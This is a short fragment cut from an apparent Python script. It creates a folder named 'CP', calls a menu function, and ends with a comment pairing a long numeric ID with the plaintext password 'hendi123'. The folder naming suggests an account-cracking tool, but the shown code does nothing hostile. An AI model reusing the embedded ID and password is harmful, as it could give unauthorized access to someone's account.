	except:pass
	try:os.mkdir('CP')
	except:pass
	menu()
	
	#61556740640184
#Password: hendi123